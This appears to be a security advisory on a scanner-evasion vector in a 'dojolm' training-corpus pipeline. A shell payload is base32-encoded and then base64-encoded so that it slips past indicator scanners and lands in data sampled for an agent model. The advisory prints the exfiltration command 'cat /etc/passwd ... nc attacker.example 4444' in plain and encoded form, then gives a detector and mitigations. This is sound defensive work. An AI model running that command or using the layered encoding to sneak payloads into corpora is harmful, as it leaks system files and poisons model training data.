# dojolm encoded vector P1-W24/105

**Mechanism:** payload is encoded base32 first, then the base32 string
is base64-encoded for transport. A scanner that decodes the outer
base64 sees a base32 string (uppercase A-Z + 2-7), which most
indicator rule-sets do NOT auto-recognise as another encoding layer
(base32 is uncommon outside DNS and TOTP secrets). The consumer
runs base64-decode then base32-decode and arrives at the working
payload.

**Severity:** HIGH — multi-step (base64 then base32 decode);
partial-impact (only consumers with the `base32_v1` codec hint
chain both decodes; default codec hint is `none`).

## Working primitive (paste into any base32 + base64 CLI to verify)

Original payload (the thing the consumer ultimately runs):

```
cat /etc/passwd > /tmp/exfil; nc attacker.example 4444 < /tmp/exfil
```

After base32 encoding (this is what the scanner sees after one
base64-decode):

```
MNQXIIBPMV2GGL3QMFZXG53EEA7CAL3UNVYC6ZLYMZUWYOZANZRSAYLUORQWG23FOIXGK6DBNVYGYZJAGQ2DINBAHQQC65DNOAXWK6DGNFWA====
```

After base64 (this is what travels on the wire):

```
TU5RWElJQlBNVjJHR0wzUU1GWlhHNTNFRUE3Q0FMM1VOVllDNlpMWU1aVVdZT1pBTlpSU0FZTFVPUlFXRzIzRk9JWEdLNkRCTlZZR1laSkFHUTJESU5CQUhRUUM2NUROT0FYV0s2REdORldBPT09PQ==
```

Round-trip verification (two-step decode):

```
$ printf '%s' 'TU5RWElJQlBNVjJHR0wzUU1GWlhHNTNFRUE3Q0FMM1VOVllDNlpMWU1aVVdZT1pBTlpSU0FZTFVPUlFXRzIzRk9JWEdLNkRCTlZZR1laSkFHUTJESU5CQUhRUUM2NUROT0FYV0s2REdORldBPT09PQ==' \
    | base64 -d \
    | base32 -d
cat /etc/passwd > /tmp/exfil; nc attacker.example 4444 < /tmp/exfil
```

## The wire field as it would be ingested

The dojolm corpus pipeline accepts a `payload_codec` hint on every
ingest record. The base32+base64 chain is shipped with the hint set
to `base32_v1`:

```json
{
  "ingest_kind": "training_corpus",
  "shard_id": "shard-0142",
  "payload_b64": "TU5RWElJQlBNVjJHR0wzUU1GWlhHNTNFRUE3Q0FMM1VOVllDNlpMWU1aVVdZT1pBTlpSU0FZTFVPUlFXRzIzRk9JWEdLNkRCTlZZR1laSkFHUTJESU5CQUhRUUM2NUROT0FYV0s2REdORldBPT09PQ==",
  "payload_codec": "base32_v1",
  "tags": ["legacy", "ops-runbook"]
}
```

The `payload_codec: base32_v1` triggers the additional base32-decode
step in the consumer.

## Single-pass scanner observation

Decoding the outer base64 produces:

```
MNQXIIBPMV2GGL3QMFZXG53EEA7CAL3UNVYC6ZLYMZUWYOZANZRSAYLUORQWG23FOIXGK6DBNVYGYZJAGQ2DINBAHQQC65DNOAXWK6DGNFWA====
```

This is uppercase letters and digits 2-7 only. To a substring-match
indicator scanner the string contains no `cat`, no `passwd`, no `nc`,
no `attacker`. To an entropy scanner the string is high-entropy but
that does not by itself fire any blocking rule.

## Two-pass consumer observation

The corpus pipeline consumer does:

```
const outer = Buffer.from(payload_b64, 'base64');
const decoded = (payload_codec === 'base32_v1')
  ? base32.decode(outer.toString('ascii'))
  : outer;
appendShard(shard_id, decoded);
```

After both decode steps, the shard data contains a working command
sequence. If the corpus is then sampled into an example for the
agent, the command sequence reaches the model.

## Why HIGH not CRITICAL

Partial-impact: only ingest records with `payload_codec: base32_v1`
chain both decodes; the default hint produces a single decode and
the result is opaque base32 ASCII that no consumer interprets. The
historical reason for the hint is one runbook export from 2024 that
embedded TOTP-style codes; the runbook has been deleted but the
codec hint remains.

Multi-step: requires base64-decode AND base32-decode AND the
`base32_v1` hint. A scanner that runs at any single layer cannot see
the final form.

## Two-stage detector

Stage 1: at the boundary, after base64-decode, if the decoded text
matches `^[A-Z2-7=]+$` AND length is a multiple of 8 (base32 padding
boundary), AND the field hint is `base32_v1`, flag the payload as
"chained-codec" and apply base32-decode for indicator scanning.

Stage 2: at the corpus append step, run the indicator scanner on
the assembled shard contents BEFORE persistence. Reject any shard
whose post-decode form contains shell-execution tokens.

## Mitigation

Remove the `base32_v1` hint; the runbook integration that needed it
has been deleted. If removal is blocked by an audit window, gate the
chained-decode path behind a feature flag default-off in production.
Re-run the indicator scanner on every decoded form. Bound the total
decode depth at 2 platform-wide and emit a metric whenever the bound
is reached so the operator can observe legitimate-but-rare uses.

## Differs from W17/encoded HIGH

The W17 vector chained two base64 layers. This W24/105 vector mixes
two distinct alphabets so that even a scanner that recognises
"another base64 layer" misses the inner layer entirely (base32 is
not in the default chained-codec list).
